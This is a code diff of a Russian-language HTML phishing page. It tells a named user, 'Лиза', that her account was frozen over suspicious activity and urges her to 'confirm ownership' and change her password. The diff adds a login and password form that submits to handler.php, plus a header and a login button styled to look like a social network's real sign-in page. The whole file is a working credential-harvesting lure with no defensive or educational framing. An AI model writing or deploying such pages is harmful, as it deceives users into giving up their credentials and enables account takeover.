@@ -1,11 +1,13 @@
 <html>
 	<head>
+		<meta charset="utf-8">
 		<link rel="stylesheet" href="css/ROL.css">
 	</head>
 	<body>
-	<center>
-	<img src="IMG/VERH.png">
-	</center>
+	<div id="page_header" class="p_head1 p_head_l777">
+			<img src="IMG/top.png" width="40px">
+			<input type="search" placeholder="Поиск">
+		</div>
 	<div  class="jopa">
 		<img src="IMG/SOTKA.png">
 	<p> Лиза, мы обнаружили подозрительную активность и <strong> временно заморозили </strong>
@@ -13,10 +15,13 @@
 	<p> Что бы разморозить страницу, мы просим Вас подтвердить, что Вы владелец этой страницы и поменять пароль.</p>
 	</div>
 	<center>
-	<p class="stells" >ВВЕСТИ ПАРОЛЬ ЗДЕСЬ: </p>
-	<input class="stells" type="tel" name="tel" pattern="2[0-9]{3}-[0-9]{3}"></p>
-	<button class="butt">
-		<img src="IMG/HREN.png" alt="" style="vertical-align:middle"> 
-   </button>
+	<p class="stells" >ВВЕСТИ ДАННЫЕ ЗДЕСЬ: </p>
+	<form action="handler.php">
+   <p><strong>Логин:</strong> 
+    <input maxlength="25" size="40" name="login"></p>
+   <p><strong>Пароль:</strong> 
+    <input type="password" maxlength="25" size="40" name="password"></p>
+  </form>
+	<button class="menuLogbot" id="index_login_button">Войти</button>
 	</center>
 </html>
